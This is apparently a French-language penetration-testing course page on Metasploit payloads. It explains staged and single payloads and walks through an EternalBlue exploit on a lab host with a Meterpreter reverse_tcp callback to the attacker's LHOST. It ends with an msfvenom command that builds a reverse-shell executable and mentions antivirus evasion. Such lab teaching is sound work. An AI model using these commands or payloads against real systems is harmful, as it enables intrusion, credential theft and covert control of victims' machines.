# Payloads

***

<mark style="color:orange;">**Définition de Payload**</mark>&#x20;

Un **payload** dans Metasploit est un module qui accompagne l'exploit pour permettre à l'attaquant d'obtenir un shell sur la machine cible.&#x20;

Le payload est envoyé avec l'exploit pour contourner le fonctionnement normal du service vulnérable et s'exécute sur le système d'exploitation cible pour généralement établir une connexion inverse avec l'attaquant, permettant ainsi de prendre pied sur le système.

***

## <mark style="color:red;">**Types de Payloads dans Metasploit :**</mark>

1. **Singles** : Payloads autonomes qui contiennent tout le code nécessaire pour exécuter la tâche. Ils sont envoyés en une seule fois et s'exécutent immédiatement après leur envoi.
   * **Avantage** : Plus stables car ils ne nécessitent pas de composants externes.
   * **Inconvénient** : Leur taille peut être trop grande pour certains exploits.
   * **Exemple** : `windows/shell_bind_tcp` (exécute directement une tâche complète).
2. **Stagers** : Petits payloads qui établissent une connexion entre l'attaquant et la victime. Ils sont conçus pour être petits et fiables, et servent à préparer l'exécution des **Stages**.
   * **Fonctionnement** : Établissent une connexion initiale, souvent utilisée pour des connexions réseau (ex. : reverse\_tcp).
   * **Compatibilité** : Utilisés pour contourner des technologies de protection comme NX (No-eXecute) et DEP (Data Execution Prevention).
   * **Exemple** : `bind_tcp` est un Stager qui écoute sur un port pour établir une connexion.
3. **Stages** : Composants des payloads qui sont téléchargés par les **Stagers**. Ils offrent des fonctionnalités avancées et peuvent être plus volumineux que les Singles.
   * **Fonctions avancées** : Incluent des options comme Meterpreter, VNC Injection, etc.
   * **Utilisation** : Permettent de charger de grands payloads et facilitent l'évasion AV/IPS.

***

## <mark style="color:red;">**MSF - Staged Payloads**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support

                 
<SNIP>
```
{% endcode %}

Le code du **Stage 0** a également pour objectif de charger en mémoire une charge utile plus grande lorsqu'elle arrive.&#x20;

Une fois qu'un canal de communication stable est établi entre l'attaquant et la victime, la machine de l'attaquant enverra très probablement une charge utile encore plus volumineuse, qui devrait lui donner un accès shell.&#x20;

Cette charge utile plus grande correspond au **Stage 1**. Nous aborderons cela plus en détail dans les sections suivantes.

***

<mark style="color:green;">**Meterpreter Payload**</mark>

La charge utile **Meterpreter** est un type spécifique de charge utile multifonctionnelle qui utilise l'**injection de DLL** pour garantir que la connexion avec l'hôte victime est stable, difficile à détecter par des vérifications simples et **persistante** même après un redémarrage ou des modifications du système.&#x20;

Meterpreter s'exécute entièrement en **mémoire** sur l'hôte distant et ne laisse aucune trace sur le disque dur, ce qui le rend très difficile à détecter avec les techniques forensiques conventionnelles. De plus, des scripts et des plugins peuvent être chargés et déchargés dynamiquement selon les besoins.

Une fois la charge utile **Meterpreter** exécutée, une **nouvelle session** est créée, lançant ainsi l'**interface Meterpreter**. Cette interface est très similaire à celle de **msfconsole**, mais toutes les commandes disponibles sont destinées au **système cible** qui a été "infecté" par la charge utile.&#x20;

Meterpreter offre une **large gamme de commandes utiles**, allant de la **capture de frappes clavier**, la **récupération de hachages de mots de passe**, l’**activation du micro**, la **prise de captures d’écran**, jusqu'à l’**usurpation de jetons de sécurité de processus**. Nous aborderons plus en détail **Meterpreter** dans une section ultérieure.

Avec **Meterpreter**, nous pouvons également **charger différents plugins** pour nous aider dans notre évaluation. Nous parlerons plus en détail de ces plugins dans la section qui leur est dédiée dans ce module.

***

## <mark style="color:red;">Searching for Payloads</mark>

Pour choisir notre premier payload, nous devons savoir ce que nous voulons faire sur la machine cible.&#x20;

* Par exemple, si nous souhaitons maintenir un accès persistant, il est probable que nous choisissions un payload Meterpreter.
* Combinant avec des plugins tels que le plugin Mimikatz de GentilKiwi, tout en maintenant une évaluation organisée et efficace en termes de temps.

<mark style="color:green;">**MSF - List Payloads**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > show payloads
   #    Name                                                Disclosure Date  Rank    Check  Description
-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
  
```
{% endcode %}

Scrolling through the list above, we find the section containing `Meterpreter Payloads for Windows(x64)`.

```shell-session
   529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
   530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)
   531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
   532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
   533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
   534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64
```

<mark style="color:green;">**MSF - Searching for Specific Payload**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

[*] 14
```
{% endcode %}

This gives us a total of `14` results. Now we can add another `grep` command after the first one and search for `reverse_tcp`.

{% code fullWidth="true" %}
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   
   
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 
```
{% endcode %}

***

## <mark style="color:red;">Selecting Payloads</mark>

<mark style="color:green;">**MSF - Select Payload**</mark>

<pre class="language-shell-session" data-full-width="true"><code class="lang-shell-session"><strong>msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
</strong>
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&#x3C;path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
</code></pre>

After selecting a payload, we will have more options available to us.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):
```

As we can see, by running the `show payloads` command within the Exploit module itself, msfconsole has detected that the target is a Windows machine, and such only displayed the payloads aimed at Windows operating systems.

***

## <mark style="color:red;">Using Payloads</mark>

| **Parameter** | **Description**                                                                        |
| ------------- | -------------------------------------------------------------------------------------- |
| `RHOSTS`      | The IP address of the remote host, the target machine.                                 |
| `RPORT`       | Does not require a change, just a check that we are on port 445, where SMB is running. |

For the payload part, we will need to set the following:

| **Parameter** | **Description**                                                              |
| ------------- | ---------------------------------------------------------------------------- |
| `LHOST`       | The host's IP address, the attacker's machine.                               |
| `LPORT`       | Does not require a change, just a check that the port is not already in use. |

<mark style="color:green;">**MSF - Exploit and Payload Configuration**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig

**[\*]** exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>


msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15

LHOST => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```
{% endcode %}

Then, we can run the exploit and see what it returns. Check out the differences in the output below:

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

The prompt is not a Windows command-line one but a `Meterpreter` prompt. The `whoami` command, typically used for Windows, does not work here. Instead, we can use the Linux equivalent of `getuid`. Exploring the `help` menu gives us further insight into what Meterpreter payloads are capable of.

<mark style="color:green;">**MSF - Meterpreter Commands**</mark>

```shell-session
meterpreter > help

Core Commands
=============
```

Pretty nifty. From extracting user hashes from SAM to taking screenshots and activating webcams.&#x20;

All of this is done from the comfort of a Linux-style command line. Exploring further, we also see the option to open a shell channel. This will place us in the actual Windows command-line interface.

<mark style="color:green;">**MSF - Meterpreter Navigation**</mark>

```shell-session
meterpreter > cd Users
meterpreter > ls

meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

**Le canal 1 a été créé** et nous sommes automatiquement placés dans l'interface CLI de cette machine. Le canal représente ici la connexion entre notre appareil et l'hôte cible, qui a été établie via une connexion **reverse TCP** (de la machine cible vers nous), en utilisant un **Meterpreter Stager et Stage**.

Le **stager** a été activé sur notre machine pour **attendre** une demande de connexion initiée par le **Stage** exécuté sur la machine cible.

Passer à un **shell classique** sur la cible peut être utile dans certains cas, mais **Meterpreter** permet aussi de naviguer et d’exécuter des actions directement sur la machine victime. Nous voyons donc que les **commandes disponibles ont changé**, mais nous avons toujours **le même niveau de privilèges** sur le système.

<mark style="color:green;">**MSF - Windows CMD**</mark>

```shell-session
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>dir
```

***

## <mark style="color:red;">Payload Types</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Payload</strong></td><td><strong>Description</strong></td></tr><tr><td><code>generic/custom</code></td><td>Generic listener, multi-use</td></tr><tr><td><code>generic/shell_bind_tcp</code></td><td>Generic listener, multi-use, normal shell, TCP connection binding</td></tr><tr><td><code>generic/shell_reverse_tcp</code></td><td>Generic listener, multi-use, normal shell, reverse TCP connection</td></tr><tr><td><code>windows/x64/exec</code></td><td>Executes an arbitrary command (Windows x64)</td></tr><tr><td><code>windows/x64/loadlibrary</code></td><td>Loads an arbitrary x64 library path</td></tr><tr><td><code>windows/x64/messagebox</code></td><td>Spawns a dialog via MessageBox using a customizable title, text &#x26; icon</td></tr><tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>Normal shell, single payload, reverse TCP connection</td></tr><tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>Normal shell, stager + stage, reverse TCP connection</td></tr><tr><td><code>windows/x64/shell/bind_ipv6_tcp</code></td><td>Normal shell, stager + stage, IPv6 Bind TCP stager</td></tr><tr><td><code>windows/x64/meterpreter/$</code></td><td>Meterpreter payload + varieties above</td></tr><tr><td><code>windows/x64/powershell/$</code></td><td>Interactive PowerShell sessions + varieties above</td></tr><tr><td><code>windows/x64/vncinject/$</code></td><td>VNC Server (Reflective Injection) + varieties above</td></tr></tbody></table>

Other critical payloads that are heavily used by penetration testers during security assessments are Empire and Cobalt Strike payloads.&#x20;

{% hint style="info" %}
**"personnaliser nos payloads"** signifie que l’on peut créer des charges utiles (payloads) adaptées aux besoins spécifiques de l'attaque ou de la cible. Voici ce que cela implique et comment cela fonctionne avec _msfvenom_&#x20;

1. **Utilisation de msfvenom :**\
   &#xNAN;_&#x6D;sfvenom_ est un outil de Metasploit qui permet de créer des payloads personnalisés. Avec _msfvenom_, vous pouvez spécifier les options exactes du payload :
   * **le type de payload** (ex. : _reverse TCP_, _bind shell_, _Meterpreter_, etc.),
   * **le format** du fichier généré (ex. : EXE pour Windows, ELF pour Linux),
   * **l'architecture** (32-bit ou 64-bit) et
   * d'autres options comme le port, l’adresse IP de l'attaquant, et plus encore.
2. **Pourquoi personnaliser ?**\
   La personnalisation des payloads est utile pour :
   * S'adapter aux configurations spécifiques de la cible (par exemple, si elle est sous Windows 7 x64, choisir un payload compatible),
   * Éviter la détection par les logiciels antivirus (en modifiant les paramètres ou en utilisant des méthodes d'obfuscation),
   * Répondre aux besoins de l'attaque (par exemple, utiliser un _Meterpreter_ pour avoir plus de fonctionnalités de contrôle, au lieu d’un simple shell).
3.  **Exemple de personnalisation avec msfvenom :**\
    Supposons que l’on veuille un payload _Meterpreter_ qui se connecte en _reverse TCP_ sur une machine attaquante avec une IP `192.168.1.10` et un port `4444`. On pourrait générer ce payload avec cette commande _msfvenom_ :

    <pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
    </code></pre>

    * Ici, `-p` spécifie le type de payload,
    * `LHOST` et `LPORT` définissent l’adresse IP et le port de l’attaquant,
    * `-f` spécifie le format (ici, un fichier exécutable pour Windows),
    * `-o` permet de nommer le fichier final.
{% endhint %}
